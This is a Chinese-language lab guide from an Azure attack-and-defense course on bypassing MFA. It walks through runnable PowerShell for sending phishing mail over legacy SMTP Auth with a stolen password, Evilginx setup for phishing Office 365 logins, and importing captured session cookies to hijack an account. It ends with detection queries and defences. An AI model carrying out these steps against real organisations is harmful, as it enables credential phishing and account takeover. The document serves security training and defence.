# Learning Objective 15：SMTP 协议滥用与 Evilginx 中间人钓鱼

> **概述**：本实验将模拟一个完整的 AiTM（Adversary-in-the-Middle）攻击链条，从利用传统协议漏洞绕过 MFA 发送钓鱼邮件，到使用 Evilginx 进行中间人攻击窃取会话 Cookie，最终实现权限提升。

---

## 目录

1. [学习目标](#学习目标)
2. [理论基础](#理论基础)
3. [实验环境与前提条件](#实验环境与前提条件)
4. [技术原理](#技术原理)
5. [实验步骤](#实验步骤)
6. [检测与防御](#检测与防御)
7. [参考资料](#参考资料)

---

## 学习目标

### 核心目标

1. **利用旧协议绕过 MFA**：发现用户 `carljmorales` 虽然开启了 MFA，但仍允许 **SMTP Auth**（一种传统验证协议）。利用这一点绕过 MFA，使用该用户的身份发送钓鱼邮件。

2. **搭建钓鱼基础设施**：配置 **Evilginx**，这是一个能够绕过 MFA 的高级钓鱼框架。

3. **实施钓鱼攻击**：向目标用户 `adamjelder` 发送带有 Evilginx 钓鱼链接的邮件。

4. **窃取会话 Cookie**：截获 Adam 的 **会话 Cookie (Session Cookie)**，并通过"传递 Cookie"的方式，在无需输入密码和 MFA 的情况下登录 Azure 门户。

### 预期成果

- 成功利用 SMTP Auth 绕过 MFA 发送钓鱼邮件
- 成功配置 Evilginx 钓鱼站点并捕获会话 Cookie
- 成功通过 Cookie 注入接管目标账户
- 理解 AiTM 攻击的完整攻击链条和检测防御方法

---

## 理论基础

### AiTM 攻击背景

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 62-98 行）

Adversary-in-the-Middle (AiTM) 攻击是一种能够绕过多因素认证 (MFA) 的高级钓鱼技术。根据 Microsoft Digital Defense Report 2023：
- 自 2017 年以来，开源免费的 AiTM 钓鱼工具包开始出现
- 2021 年开始，AiTM 能力被大规模钓鱼活动采用
- 2022 年，该技术变得普遍，取代了更传统的凭据钓鱼形式

### Token Replay Attacks

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 74-88 行）

不同类型的令牌在云身份验证中起着至关重要的作用：
- **Session Cookie**：在用户成功认证后由身份验证服务颁发，作为用户已通过认证的证明
- **特点**：Cookie 中已包含 MFA 声明，因此重放 Cookie 可以绕过 MFA 要求
- **攻击链**：窃取 Cookie → 重放 Cookie → 访问受害者账户

### MITRE ATT&CK 映射

> **资料来源**：[media/mitre/Update-Jan-2025/Old/MITRE-AiTM.json](./media/mitre/Update-Jan-2025/Old/MITRE-AiTM.json)

本实验涵盖以下 MITRE ATT&CK 技术点：

| TTP | 描述 | 相关性 |
|-----|------|--------|
| **T1557** | Adversary-in-the-Middle | Evilginx 反向代理 |
| **T1566.002** | Spearphishing Link | 钓鱼邮件链接 |
| **T1111** | Multi-Factor Authentication Interception | MFA 拦截 |
| **T1212** | Exploitation for Credential Access | 凭据访问利用 |
| **T1078.004** | Valid Accounts: Cloud Accounts | 使用被盗账户 |
| **T1583.003** | Acquire Infrastructure: VPS | 部署钓鱼基础设施 |

---

## 实验环境与前提条件

### 软件与工具

| 工具 | 版本要求 | 用途 | 下载/参考 |
|------|----------|------|-----------|
| **Evilginx** | 2.x 或 3.x | AiTM 钓鱼框架 | [GitHub: evilginx2](https://github.com/kgretzky/evilginx2) |
| **Technitium DNS** | 最新版 | DNS 解析配置 | 官方网站 |
| **PowerShell** | 5.1+ | SMTP 钓鱼邮件发送 | 系统自带 |
| **Cookie-Editor** | 浏览器插件 | Cookie 注入 | Chrome 扩展商店 |

### 网络与域名条件

| 条件 | 为什么需要 | 配置说明 |
|------|------------|----------|
| **自定义域名** | Evilginx 需要域名来伪装合法服务 | 如 `studentX.corp` |
| **DNS A 记录** | 将域名解析到钓鱼服务器 IP | `login.studentX.corp` → VM IP |
| **587 端口** | SMTP Submission 协议端口 | 用于 TLS 加密邮件发送 |
| **443/80 端口** | HTTPS/HTTP 通信端口 | Evilginx 反向代理 |

### 为什么需要这些条件？

1. **域名与 DNS**：Evilginx 作为反向代理，需要一个看起来"合法"的域名来降低受害者警觉。DNS 解析确保流量能正确路由到攻击者控制的服务器。

2. **SMTP 587 端口**：标准 SMTP Submission 端口，支持 TLS 加密。这是 Office 365 接受加密连接的端口配置。

3. **HTTPS 端口**：现代浏览器会对非 HTTPS 连接显示警告，这会降低钓鱼成功率。

### Entra ID 配置（漏洞场景）

| 配置项 | 状态 | 为什么形成漏洞 |
|--------|------|----------------|
| **Legacy Authentication (SMTP)** | **启用** | 旧协议不支持 MFA 验证 |
| **MFA 策略** | 已配置 | 仅对现代认证生效 |
| **条件访问策略** | 未限制设备 | 无法检测反向代理 |
| **会话管理** | 无刷新频率 | Cookie 有效期长 |

---

## 技术原理

### 原理 A：SMTP Auth 与 MFA 的"后门"

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) + 目标 15 原始文档

现代身份验证（Modern Auth）支持 MFA，但为了兼容旧的打印机、扫描仪或邮件客户端，微软允许保留旧的 **Legacy Authentication**（如 SMTP, POP3, IMAP）。

**漏洞机制**：
```
┌─────────────────────────────────────────────────────────────────┐
│                    传统认证 vs 现代认证                          │
├─────────────────────────────────────────────────────────────────┤
│ 现代认证 (OAuth2/SAML)     │  传统认证 (Basic Auth)            │
│ ├─ 支持 MFA 弹窗            │  ├─ 仅支持用户名/密码            │
│ ├─ 设备状态检查             │  ├─ 不支持 MFA                  │
│ └─ 条件访问策略             │  └─ 绕过条件访问                │
└─────────────────────────────────────────────────────────────────┘
```

**类比（侧门）**：
- **前门（Web 登录）**：有保安（MFA），需要刷脸卡
- **侧门（SMTP）**：是给送货员（旧设备）留的，只认钥匙（密码），不查脸

### 原理 B：Evilginx 与 AiTM 攻击

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 128-153 行）

传统的钓鱼网站是做一个假页面骗密码，但过不了 MFA。Evilginx 是一个**反向代理**。

**攻击流程**：

```
┌─────────┐        ┌──────────────┐        ┌──────────┐
│ 受害者   │ <───> │  Evilginx    │ <───> │ 微软登录  │
│ 浏览器   │        │  (反向代理)  │        │  服务器   │
└─────────┘        └──────────────┘        └──────────┘
    │                    │                      │
    │ 1. 访问钓鱼链接     │ 2. 转发真实请求      │
    │                    ├──>                   │
    │                    │ 3. 返回真实登录页     │
    │  <─────────────────┤                      │
    │ 4. 输入凭据+MFA     │                      │
    │ ─────────────────> │                      │
    │                    │ 5. 转发凭据          │
    │                    ├──>───────────────────>│
    │                    │ 6. 验证成功，返回Cookie│
    │                    │ <────────────────────┤
    │ 7. 登录成功(副本)   │ 8. 窃取Cookie(原件)  │
    │ <─────────────────┤ ⚠️ 保存Cookie         │
```

**关键点**：登录成功后，微软会发回一个 **Session Cookie**。Evilginx 截获这个 Cookie，自己留一份，再转发给受害者。

**类比（传话游戏）**：
- 你（受害者）和银行（微软）隔着一堵墙
- 攻击者（Evilginx）站在墙中间传话
- 你把银行卡和密码给攻击者 → 攻击者转交给银行
- 银行验证通过 → 发了一张"VIP 通行证"（Cookie）给攻击者
- 攻击者把通行证复印了一份自己留着 → 原件给你
- 现在攻击者也有通行证了！

---

## 实验步骤

### 步骤 1：利用 SMTP 发送钓鱼邮件 (The Delivery)

**目的**：利用 SMTP Auth 协议绕过 MFA，以 `carljmorales` 的身份发送钓鱼邮件。

#### 前置条件

- 已获取 Carl 的凭据（来自之前的实验步骤）
- 目标 SMTP 服务器：`smtp.office365.com:587`
- SMTP 协议支持 TLS 加密

#### 为什么使用 SMTP？

根据 [Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) 理论基础：
- SMTP Auth 是传统协议，不支持 MFA 验证流程
- 使用内部用户发送邮件，钓鱼邮件的信任度更高
- 邮件不会被标记为"来自外部发件人"

#### 实施步骤

**1. 准备凭据**（使用从 Teams 聊天记录中发现的 Carl 的新密码）：

```powershell
$password = ConvertTo-SecureString 'Ac*Ik8+U1C0e:6!!aF[y' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('carljmorales@...', $password)
```

**2. 配置邮件参数**：

```powershell
$mailParams = @{
    SmtpServer = 'smtp.office365.com'
    Port = '587'                      # SMTP Submission 端口
    UseSSL = $true                    # 启用 TLS 加密
    Credential = $creds               # Carl 的凭据
    From = 'carljmorales@...'
    To = 'AdamJElder@...'
    Subject = "New Link..."
    Body = 'Use link <你的Evilginx钓鱼链接>'  # 将在步骤 3 生成
}
```

**3. 发送邮件**：

```powershell
Send-MailMessage @mailParams -Verbose
```

#### 预期结果

```
VERBOSE: The SMTP server requires a secure connection.
VERBOSE: Connected to smtp.office365.com on port 587.
VERBOSE: Successfully authenticated to the SMTP server.
VERBOSE: Message sent to AdamJElder@...
```

#### 验证要点

- 邮件成功发送，证明**绕过了 MFA**
- 发件人显示为内部用户 `carljmorales`
- 邮件未被安全网关拦截

---

### 步骤 2：配置 Evilginx 基础设施 (Infrastructure Setup)

**目的**：搭建钓鱼站点的 DNS 和反向代理基础设施。

#### 为什么需要 DNS 配置？

Evilginx 作为反向代理，需要一个看起来"合法"的域名：
- 降低受害者的警觉心
- 绕过基本的 URL 过滤
- 支持自动化的 TLS 证书生成

#### 2.1 DNS 配置 (Technitium)

**1. 登录攻击者提供的 DNS 管理界面**

**2. 添加区域 (Zone)**：
```
Zone 名称: studentX.corp  (X 为学号)
```

**3. 添加 A 记录**：

| 记录名称 | 类型 | IP 地址 | 用途 |
|----------|------|---------|------|
| `login` | A | `<你的VM IP>` | 钓鱼登录页 |
| `www` | A | `<你的VM IP>` | 通用钓鱼页 |

**示例**（假设 VM IP 为 `172.16.151.15`）：
```
login.studentX.corp   A   172.16.151.15
www.studentX.corp     A   172.16.151.15
```

#### 2.2 启动 Evilginx

**1. 开发者模式启动**（使用自签名证书）：

```powershell
evilginx.exe -p phishlets -developer
```

**参数说明**：
- `-p phishlets`：指定 phishlets 目录
- `-developer`：开发者模式，允许使用自签名证书

**2. 初始化配置**：

```text
config domain studentX.corp
config ipv4 <你的VM IP>
phishlets hostname o365 studentX.corp
```

**配置说明**：
- `config domain`：设置钓鱼域名
- `config ipv4`：设置服务器 IP 地址
- `phishlets hostname`：配置 O365 钓鱼模板的主机名

#### 预期结果

```
[*] Phishing portal enabled at https://login.studentX.corp
[*] SSL certificate generated successfully
```

---

### 步骤 3：生成诱饵并启用 (Lure Generation)

**目的**：生成一个特定的钓鱼 URL，当 Adam 点击时，Evilginx 知道该把流量导向哪里。

#### 什么是 Lure？

Lure（诱饵）是 Evilginx 中的一个概念，它包含：
- 钓鱼目标的重定向 URL
- 会话标识符
- 与受害者相关的参数

#### 生成步骤

**1. 启用 Office 365 钓鱼模板**：

```text
phishlets enable o365
```

**2. 创建诱饵**：

```text
lures create o365
```

**输出示例**：
```
[*] Lure created:
    ID: 0
    URL: https://login.studentX.corp/X7k2P9m1L4qR8wN3/
```

**3. 获取钓鱼链接**：

```text
lures get-url 0
```

**4. 将链接填入步骤 1 的邮件**：

```powershell
$phishingUrl = "https://login.studentX.corp/X7k2P9m1L4qR8wN3/"
$mailParams.Body = "Please review this important document: $phishingUrl"
```

**5. 重新发送邮件**（如果步骤 1 中尚未发送）：

```powershell
Send-MailMessage @mailParams -Verbose
```

---

### 步骤 4：捕获会话与 Cookie 注入 (The Exploit)

**目的**：当 Adam 点击钓鱼链接并完成认证后，窃取其会话 Cookie 并注入到攻击者浏览器。

#### 4.1 监控 Evilginx 控制台

当实验环境中的 Adam 模拟用户点击链接并登录后：

**1. 查看捕获的会话**：

```text
sessions
```

**输出示例**：
```
ID  | Phishlet | Lure | User                    | Captured at
----|----------|------|-------------------------|-------------
1   | o365     | 0    | adamjelder@corp.com     | 2024-01-15 10:23:45
```

**2. 查看会话详情**：

```text
sessions 1
```

**关键数据**（JSON 格式）：
```json
{
  "username": "adamjelder@corp.com",
  "cookies": [
    {
      "name": "ESTSAUTH",
      "value": "eyJ0eXAiOiJKV1QiLCJhbGc...",
      "domain": ".login.microsoftonline.com",
      "path": "/",
      "secure": true,
      "httpOnly": true
    },
    {
      "name": "ESTSAUTHPERSISTENT",
      "value": "eyJ0eXAiOiJKV1QiLCJhbGc...",
      "domain": ".login.microsoftonline.com",
      "path": "/",
      "secure": true,
      "httpOnly": true
    }
  ],
  "custom": [
    {
      "name": "pwdLastSet",
      "value": "1336387200000"
    },
    {
      "name": "locale",
      "value": "en-US"
    }
  ]
}
```

**关键 Cookie 说明**：

| Cookie 名称 | 作用 | 重要程度 |
|-------------|------|----------|
| `ESTSAUTH` | 短期会话令牌 | ⭐⭐⭐ |
| `ESTSAUTHPERSISTENT` | 持久化会话令牌 | ⭐⭐⭐ |
| `SSOState` | SSO 状态标记 | ⭐⭐ |

#### 4.2 Cookie 注入

**1. 复制 Evilginx 输出的完整 JSON 数据**

**2. 打开 Chrome 浏览器，访问 `portal.azure.com`**（此时应为未登录状态）

**3. 打开 Cookie-Editor 插件**：
   - 点击浏览器右上角的插件图标
   - 选择 "Import"（导入）

**4. 粘贴 JSON 并保存**：
   - 将复制的 JSON 粘贴到导入框
   - 点击 "Import" 按钮

**5. 刷新页面**

#### 预期结果

```
✅ 成功以 adamjelder@corp.com 身份登录 Azure 门户
✅ 无需输入密码
✅ 无需 MFA 验证
✅ 可访问 Adam 的所有 Azure 资源
```

---

## 检测与防御

### 检测方法

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 198-842 行）

#### 1. OfficeHome 应用异常登录检测

**查询文件**：[queries/AiTM/SearchCookies.kql](./queries/AiTM/SearchCookies.kql)

**原理**：
- OfficeHome 应用 (ApplicationId: `4765445b-32c6-49b0-83e6-1d93765276ca`) 在 AiTM 攻击中被广泛使用
- 通过追踪 `SessionId`，可以检测 Cookie 是否在不同国家/地区被重放

**KQL 查询**：
```kql
// 检测 OfficeHome 认证后 Cookie 在其他国家的使用
let OfficeHomeSessionIds =
EntraIdSignInEvents
| where Timestamp > ago(7d)
| where ErrorCode == 0
| where ApplicationId == "4765445b-32c6-49b0-83e6-1d93765276ca"  // OfficeHome
| where ClientAppUsed == "Browser"
| where LogonType has "interactiveUser"
| summarize arg_min(Timestamp, Country) by SessionId;

EntraIdSignInEvents
| where Timestamp > ago(7d)
| where ApplicationId != "4765445b-32c6-49b0-83e6-1d93765276ca"
| where ClientAppUsed == "Browser"
| project OtherTimestamp = Timestamp, Application, ApplicationId,
          AccountObjectId, AccountDisplayName, OtherCountry = Country, SessionId
| join OfficeHomeSessionIds on SessionId
| where OtherTimestamp > Timestamp and OtherCountry != Country
```

#### 2. 会话活动关联分析

**查询文件**：[queries/AiTM/Functions/Token_SessionIdToXdrActivities.func](./queries/AiTM/Functions/Token_SessionIdToXdrActivities.func)

**敏感活动类型**：
- `New-InboxRule` - 创建收件箱规则
- `Set-InboxRule` - 修改收件箱规则
- `HardDelete` - 硬删除邮件
- `AnonymousLinkCreated` - 创建匿名链接

#### 3. 用户行为异常检测

**查询文件**：[queries/AiTM/HuntUserActivities.kql](./queries/AiTM/HuntUserActivities.kql)

**检测维度**：
- 异常地理位置登录
- 异常时间登录
- 短时间内的大规模邮件操作
- 敏感权限操作

### Entra ID Protection 警报

| 警报类型 | 触发条件 | 检测机制 |
|----------|----------|----------|
| **Anomalous Token** | Token 具有异常特征 | 寿命、位置异常 |
| **Attacker in the Middle** | 检测到恶意反向代理 | IP 声誉、行为分析 |
| **Impossible Travel** | 不可能旅行 | 两次登录时间/距离不可能 |
| **Unfamiliar Sign-in Properties** | 未知登录属性 | 设备、IP、User-Agent 异常 |

### 防御措施

> **资料来源**：[Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md)（第 852-1007 行）

#### 1. 禁用传统认证协议

**PowerShell 命令**：
```powershell
# 禁用 SMTP Basic Auth
Set-AuthenticationPolicy -Identity "DisableBasicAuth" -AllowBasicAuthSmtp:$false
```

**Exchange Online 配置**：
- 禁用 Legacy Authentication
- 启用 Modern Authentication only

#### 2. 配置条件访问策略

**推荐策略**：

| 策略设置 | 推荐值 | 理由 |
|----------|--------|------|
| **设备要求** | 合规设备或混合加入设备 | CloudAP + WAM 阻止 Cookie 重放 |
| **认证强度** | 防钓鱼 MFA (FIDO2/CBA) | 无法被中间人拦截 |
| **会话管理** | 签名频率：每次 | 强制重新认证 |
| **网络位置** | 合规网络 (GSA) | 限制访问来源 |

#### 3. 部署 Microsoft Defender for Cloud Apps (MDA) Session Proxy

**原理**：
- MDA 作为代理检查所有会话流量
- 配合 Edge for Business 实现"浏览器内保护"
- 检测异常会话行为

**配置要求**：
- 启用 MDA 会话策略
- 要求 Edge for Business
- 配置条件访问集成

#### 4. 启用 Global Secure Access

**作用**：
- 提供统一的网络访问入口
- 支持"合规网络"条件访问策略
- 阻止非 GSA 流量的令牌获取

**策略示例**：
```
条件访问策略：
├─ 云应用：全部
├─ 网络位置：非合规网络
├─ 操作：阻止访问
└─ 结果：仅允许通过 GSA 访问
```

---

## 实验总结

### 攻击链条回顾

```
┌─────────────────────────────────────────────────────────────────┐
│                        完整攻击链                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. 凭据复用                                                    │
│     ├─ 使用之前获取的 Carl 的凭据                               │
│     └─ 来源：Teams 聊天记录                                     │
│                                                                  │
│  2. 协议绕过                                                    │
│     ├─ 利用 SMTP Auth 协议缺陷                                  │
│     ├─ 绕过 Carl 的 MFA 限制                                    │
│     └─ 获得发信能力（内部发件人，钓鱼成功率高）                 │
│                                                                  │
│  3. 设施搭建                                                    │
│     ├─ 配置 Evilginx 反向代理                                   │
│     ├─ 配置 DNS 解析                                            │
│     └─ 伪造登录页面                                             │
│                                                                  │
│  4. 中间人攻击                                                  │
│     ├─ Adam 访问钓鱼页                                          │
│     ├─ Evilginx 实时转发数据                                    │
│     └─ 骗取微软颁发的 Session Cookie                            │
│                                                                  │
│  5. 会话劫持                                                    │
│     ├─ 利用 Cookie 绕过 Adam 的 MFA                             │
│     ├─ 注入 Cookie 到浏览器                                     │
│     └─ 直接接管账户                                             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 关键收获

1. **传统协议是安全薄弱点**：SMTP Auth 等传统协议不支持 MFA，成为攻击者的突破口
2. **MFA 不是银弹**：AiTM 攻击可以通过会话 Cookie 劫持绕过 MFA
3. **多层防御的重要性**：需要结合条件访问、设备合规性、防钓鱼 MFA 等多层防御
4. **检测的挑战**：AiTM 攻击使用合法凭据和 Cookie，需要基于行为分析进行检测

---

## 参考资料

### 项目内部文档

| 资料名称 | 文件路径 | 说明 |
|----------|----------|------|
| **AiTM 攻击理论基础** | [Adversary-in-the-Middle.md](./Adversary-in-the-Middle.md) | 完整的 AiTM 攻击理论框架 |
| **MITRE ATT&CK 映射** | [media/mitre/Update-Jan-2025/Old/MITRE-AiTM.json](./media/mitre/Update-Jan-2025/Old/MITRE-AiTM.json) | 132 个技术点的完整映射 |
| **Cookie 搜索查询** | [queries/AiTM/SearchCookies.kql](./queries/AiTM/SearchCookies.kql) | OfficeHome Cookie 跨国家检测 |
| **用户活动追踪** | [queries/AiTM/HuntUserActivities.kql](./queries/AiTM/HuntUserActivities.kql) | 多维度用户行为分析 |
| **会话关联函数** | [queries/AiTM/Functions/Token_SessionIdToXdrActivities.func](./queries/AiTM/Functions/Token_SessionIdToXdrActivities.func) | SessionId 到 XDR 活动关联 |

### 官方参考资料

| 主题 | 链接 | 说明 |
|------|------|------|
| **禁用基础认证** | [Disable Basic authentication in Exchange Online](https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/disable-basic-authentication-in-exchange-online) | 微软建议禁用传统协议 |
| **Evilginx2 项目** | [GitHub: kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) | Evilginx 官方仓库 |
| **AiTM 攻击分析** | [From cookie theft to BEC: AiTM phishing sites](https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/) | Microsoft 安全博客 |
| **令牌盗取防御** | [How to prevent, detect, and respond to cloud token theft](https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/) | Microsoft 防御指南 |
| **Token Theft Playbook** | [Microsoft Token Theft Playbook](https://learn.microsoft.com/en-us/security/operations/token-theft-playbook/) | 官方应对手册 |
| **Entra ID 安全令牌** | [Entra ID Security Tokens](https://learn.microsoft.com/en-us/entra/identity-platform/security-tokens) | 令牌技术文档 |
| **认证强度策略** | [Authentication Strengths Policies](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-strengths) | 防钓鱼 MFA 配置 |

### 社区资源

| 资源 | 链接 |
|------|------|
| **John Hammond: Evilginx 教程** | [YouTube: Stealing M365 Account](https://www.youtube.com/watch?v=sZ22YulJwao) |
| **Jan Bakker: Evilginx O365 配置** | [How to set up Evilginx to phish O365](https://janbakker.tech/how-to-set-up-evilginx-to-phish-office-365-credentials/) |
| **Global Secure Access 防御 AiTM** | [Prevent AiTM with GSA and CA](https://janbakker.tech/prevent-aitm-with-microsoft-entra-global-secure-access-and-conditional-access/) |
| **Joosua Santasalo: AiTM 调查** | [GitHub: kql/aitmInvestigation.kql](https://github.com/jsa2/kql/blob/main/aitmInvestigation.kql) |

---

*文档版本：基于 AzureAD-Attack-Defense-frame 项目生成*
*更新日期：2025-01*
